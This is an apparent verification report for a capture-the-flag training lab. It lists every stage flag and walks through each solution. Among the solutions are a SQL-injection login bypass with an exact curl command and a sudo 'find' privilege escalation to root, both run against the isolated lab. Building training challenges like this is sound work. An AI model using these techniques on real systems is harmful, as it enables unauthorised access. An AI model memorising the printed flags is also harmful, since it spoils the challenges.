# Integration self-test — The Horcrux Protocol

End-to-end verification that all six stages solve from the built artefacts and
the live stack. All data is synthetic and confined to the isolated lab.

- **Date:** 2026-10-06
- **Host:** Windows 11 + Docker Desktop (engine 29.8.0, Compose v5.5.1)
- **Build:** `./build-all.sh` regenerated HX-01/03/04/05 and injected the HX-03
  ciphertext into `.env`; `docker compose up -d --build` brought up the stack.
- **Result:** HX-01 → HX-05 solve from artefacts; HX-02 solves live through the
  proxy; HX-06 privilege-escalation path verified in a container (full VM not
  runnable on this host — see Limitations).

| Stage | Flag | How verified | Status |
|-------|------|--------------|:---:|
| HX-01 | `HORCRUX{m1sch13f_m4n4g3d}` | blue-channel LSB decode via `solve.py` | ✅ |
| HX-02 | `HORCRUX{th3_d14ry_r3m3mb3rs}` | live SQLi auth bypass through proxy | ✅ |
| HX-03 | `HORCRUX{cl4ss1c4l_runes_br0k3n}` | Vigenère decode, key `RIDDLE` | ✅ |
| HX-04 | `HORCRUX{r3str1ct3d_s3ct10n_l0g5}` | log correlation + EXIF UserComment | ✅ |
| HX-05 | `HORCRUX{fl00_p0wd3r_tr4c3d}` | pcap filter + Follow-TCP-Stream | ✅ |
| HX-06 | `HORCRUX{g0bl1n_m4d3_v4ult_0wn3d}` | `sudo find` priv-esc (container) | ✅* |

\* HX-06 objective (misconfig → root → flag) proven; VM packaging not exercised.

---

## Platform

`docker compose ps` — all five services up:

```
cache     Up    6379/tcp
ctfd      Up
db        Up    5432/tcp
hx02-web  Up    5000/tcp
proxy     Up    127.0.0.1:8000->80/tcp
```

Spec §2 acceptance — `curl -I http://127.0.0.1:8000/` returns a CTFd response:

```
HTTP/1.1 302 FOUND
Location: http://127.0.0.1/setup
Server: nginx/1.27.5
```

(302 → `/setup` is a fresh, un-initialised CTFd; initial-admin setup is done in
the CTFd web UI and is out of scope for this smoke test.)

Only `proxy` publishes a port, bound to `127.0.0.1` (LAB_IP) — db/cache/ctfd/
hx02-web have no host ports, matching the isolation requirement.

---

## HX-01 — Steganography

```
$ python challenges/hx01-stego/solve.py challenges/hx01-stego/dist/marauders_map.png
HORCRUX{m1sch13f_m4n4g3d}
WEB CLUE: The Chamber portal lives at /chamber on the CTFd host. The diary
remembers a researcher named 'triddle'. Log in as that account to reach what it hides.
```

PNG `tEXt` breadcrumb ("metadata is only the doormat") present as a decoy.
The flag and the HX-02 handover clue (portal `/chamber`, user `triddle`) are
both recovered from the blue-channel LSBs, sentinel-terminated by `::END::`.

> Tooling note: `zsteg -a` (the spec's reference tool) is not installed on this
> host; the bundled `solve.py` reads the same blue-channel LSB plane and is the
> equivalent recovery.

## HX-02 — Web (live SQLi)

Through the proxy at `http://127.0.0.1:8000/chamber`:

```
# normal login fails
username=triddle & password=nope        -> "Invalid credentials"

# injection bypass
username=triddle'-- & password=x        -> "Diary of triddle"
                                           HORCRUX{th3_d14ry_r3m3mb3rs}
                                           + HX-03 ciphertext (from env)

# negative: /chamber/diary without a session leaks nothing
GET /chamber/diary (no cookie)          -> redirect to /chamber, no flag
```

Exact command (note the cookie jar — see Fixes):

```
curl -s -c /tmp/cj -b /tmp/cj \
  --data-urlencode "username=triddle'--" --data-urlencode "password=x" \
  -L http://127.0.0.1:8000/chamber/login | grep -oE "Diary of triddle|HORCRUX\{[^}]*\}"
```

## HX-03 — Cryptography

Vigenère-decode `dist/ciphertext.txt` with key `RIDDLE`:

```
The compromised researcher account is USER-472. Pull its activity from the
restricted archive and follow the outbound trail. The fragment is
HORCRUX{cl4ss1c4l_runes_br0k3n}
```

`USER-472` (the HX-04 handover identifier) is intact. On this host the decode
was done with the generator's own Vigenère routine; CyberChef "Vigenère Decode"
with key `RIDDLE` yields byte-identical output.

## HX-04 — Forensics

```
$ sha256sum -c restricted_section.sha256      # MATCH (recorded == computed)

$ grep USER-472 access.log system.log
access.log: 23:47:09 USER-472 POST /floo-console 200     (the lead)
system.log: 23:47:02 ... console session opened by USER-472

$ grep ESTABLISHED system.log
Sep 18 23:47:16 ... outbound connection ESTABLISHED -> 10.10.20.45:4444 (unexpected egress)

# evidence.jpg EXIF UserComment (exiftool stand-in via piexif):
Recovered fragment: HORCRUX{r3str1ct3d_s3ct10n_l0g5}
```

Reconstructed network indicator **10.10.20.45 : 4444 @ 23:47:16** — the HX-05
handover. `exiftool` isn't installed here; the EXIF UserComment was read with
`piexif` (same field).

## HX-05 — Networking

Filter `ip.addr==10.10.20.45 && tcp.port==4444` over `floo_network.pcap`
(34 packets total) isolates **exactly one** TCP stream. Follow-TCP-Stream:

```
FLOO TRANSFER :: next vault host 10.10.20.60 :: user vault ::
investigation code GRINGOTTS-472 :: fragment HORCRUX{fl00_p0wd3r_tr4c3d}
```

Carries the full HX-06 contract (host / user / code). `tshark`/Wireshark aren't
installed here; the pcap was parsed with `scapy` applying the identical filter
(1 matching stream confirmed).

## HX-06 — Linux privilege escalation

Full VM (Vagrant + VirtualBox) is not available on this host. The stage's
actual objective — the single bounded sudo misconfiguration leading to root —
was reproduced in an `ubuntu:22.04` container using the exact `setup.sh` logic
(user `vault`, `/root/final_fragment.txt` chmod 600, `/etc/sudoers.d/vault`):

```
visudo -cf /etc/sudoers.d/vault              -> parsed OK
vault$ cat /root/final_fragment.txt          -> Permission denied   (before)
vault$ sudo -n -l                            -> (root) NOPASSWD: /usr/bin/find
vault$ sudo -n find . -exec /bin/sh ... \;   -> id -un = root
                                                HORCRUX{g0bl1n_m4d3_v4ult_0wn3d}
```

The GTFOBins `find` escape yields a root shell and reads the flag exactly as the
answer key documents. Not exercised here: the VM image build, the host-only
`10.10.20.60` network, and the `nmap` "only ssh open" surface check — these need
VirtualBox and should be run with `challenges/hx06-vault/{Vagrantfile,verify.sh}`.

---

## Fixes applied during verification

1. **`build-all.sh` hardcoded `python3`** — absent on Windows/Git Bash (and a
   broken Microsoft Store stub shadowed it). Now probes `python3`/`python`/`py`
   and picks the first interpreter that actually runs. Harmless on Linux.
2. **CTFd could not reach Postgres** — the stock `ctfd/ctfd:3.7.7` image ships
   only `PyMySQL`, so `DATABASE_URL=postgresql+psycopg2://…` crash-looped with
   `ModuleNotFoundError: No module named 'psycopg2'`. Added `ctfd/Dockerfile`
   (base image + `psycopg2-binary==2.9.9`) and pointed the `ctfd` service at it,
   keeping the pinned CTFd and Postgres versions. Recorded in `VERSIONS.md`.
3. **CTFd redirects dropped the proxy port** — nginx forwarded `Host $host`
   (no port), so CTFd's absolute redirects (e.g. `/` → `/setup`) came back as
   `http://127.0.0.1/setup` on port 80, where nothing listens → the browser got
   *connection refused* the moment it followed the redirect. Fixed in
   `proxy/nginx.conf` to forward `Host $http_host` (+ `X-Forwarded-Host`), so
   redirects keep `:8000`. `curl -IL http://127.0.0.1:8000/` now lands on
   `http://127.0.0.1:8000/setup` (200, CTFd setup page).
4. **Broken HX-02 smoke-test command** — the documented `curl … -L …/chamber/login`
   omitted a cookie jar, so the Flask session set on the 302 was dropped and the
   diary never loaded (command printed nothing even on a healthy challenge).
   Fixed in `runbooks/reset.md` to use `-c/-b`. The same stale command still
   lives in the top-level `BUILD_SPEC.md` §5 (outside the repo tree) — use the
   cookie-jar form there too.

## Environment limitations (not defects)

- `zsteg`, `exiftool`, `tshark`/Wireshark, `nmap`, Vagrant and VirtualBox are
  not installed on this host. Where a spec acceptance names one, an equivalent
  programmatic check was used (noted per stage) and produced matching results.
- `gitleaks` hardening scan (spec §6) not run — this working copy is not a git
  repository. Run it before release once the repo is initialised.

## Reproduce

```
cp .env.example .env            # set LAB_IP=127.0.0.1, DB_PASSWORD, CTFD_SECRET_KEY
./build-all.sh                  # regenerate artefacts + inject HX-03 ciphertext
docker compose up -d --build    # bring up ctfd/db/cache/proxy/hx02-web
```
